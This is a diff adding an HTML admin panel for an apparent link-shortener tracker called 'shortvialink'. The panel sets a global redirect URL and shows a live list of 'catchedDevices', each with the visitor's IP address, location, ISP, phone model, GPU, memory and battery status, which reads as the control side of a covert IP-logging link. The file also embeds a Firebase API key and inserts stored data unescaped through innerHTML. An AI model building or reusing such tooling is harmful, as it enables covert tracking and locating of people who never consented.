@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
+        }
+        h1, h2 {
+            color: #333;
+        }
+        #deviceList {
+            list-style-type: none;
+            padding: 0;
+        }
+        .deviceItem {
+            border: 1px solid #ccc;
+            padding: 10px;
+            margin-bottom: 10px;
+            background-color: #f9f9f9;
+        }
+        .deviceItem h3 {
+            margin: 0;
+            font-size: 1.2em;
+        }
+        .deviceItem p {
+            margin: 5px 0;
+            color: #555;
+        }
+        .deviceItem .label {
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <h1>Admin Panel</h1>
+    
+    <!-- Global URL Section -->
+    <h2>Set Global Redirect URL</h2>
+    <label for="globalRedirectUrl">Enter New Global Redirect URL:</label>
+    <input type="text" id="globalRedirectUrl" placeholder="Enter new URL" />
+    <button id="updateGlobalUrlBtn">Update Global URL</button>
+    
+    <hr>
+
+    <!-- Device Monitoring Section -->
+    <h2>Saved Devices</h2>
+    <ul id="deviceList"></ul>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js";
+        import { getFirestore, doc, setDoc, collection, onSnapshot } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-firestore.js";
+
+        // Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyAPjvIptK9QLL38_tMJAc_mcbPlrvNm-BI",
+            authDomain: "shortvialink.firebaseapp.com",
+            projectId: "shortvialink",
+            storageBucket: "shortvialink.firebasestorage.app",
+            messagingSenderId: "898273994480",
+            appId: "1:898273994480:web:807a53bc825302af33c435",
+            measurementId: "G-6WDS2TDBKK"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        // Update Global Redirect URL
+        document.getElementById("updateGlobalUrlBtn").addEventListener("click", async () => {
+            const newGlobalRedirectUrl = document.getElementById("globalRedirectUrl").value.trim();
+
+            if (!newGlobalRedirectUrl) {
+                alert("Please enter a valid URL.");
+                return;
+            }
+
+            try {
+                // Set the global redirect URL in Firestore (This will be used for all devices)
+                const docRef = doc(db, "settings", "globalRedirectUrl");
+                await setDoc(docRef, {
+                    redirectUrl: newGlobalRedirectUrl
+                });
+                alert("Global Redirect URL updated successfully.");
+            } catch (error) {
+                console.error("Error updating global redirect URL:", error);
+                alert("Failed to update the global redirect URL.");
+            }
+        });
+
+        // Real-time Device Monitoring
+        const deviceList = document.getElementById("deviceList");
+
+        onSnapshot(collection(db, "catchedDevices"), (snapshot) => {
+            // Clear the list before updating
+            deviceList.innerHTML = '';
+
+            snapshot.forEach(doc => {
+                const deviceData = doc.data();
+                const listItem = document.createElement("li");
+                listItem.classList.add("deviceItem");
+
+                // Formatting the displayed data
+                listItem.innerHTML = `
+                    <h3>Device: ${doc.id.split(':')[0]}</h3>
+                    <p><span class="label">Device Type:</span> ${deviceData.deviceType}</p>
+                    <p><span class="label">Phone Model:</span> ${deviceData.phoneModel}</p>
+                    <p><span class="label">Operating System:</span> ${deviceData.os}</p>
+                    <p><span class="label">Browser:</span> ${deviceData.browser}</p>
+                    <p><span class="label">IP Address:</span> ${deviceData.ip}</p>
+                    <p><span class="label">Location:</span> ${deviceData.location}</p>
+                    <p><span class="label">ISP:</span> ${deviceData.isp}</p>
+                    <p><span class="label">GPU:</span> ${deviceData.gpu}</p>
+                    <p><span class="label">Memory:</span> ${deviceData.memory}</p>
+                    <p><span class="label">Screen Orientation:</span> ${deviceData.orientation}</p>
+                    <p><span class="label">Battery Status:</span> ${deviceData.battery}</p>
+                `;
+                deviceList.appendChild(listItem);
+            });
+        });
+
+    </script>
+</body>
+</html>
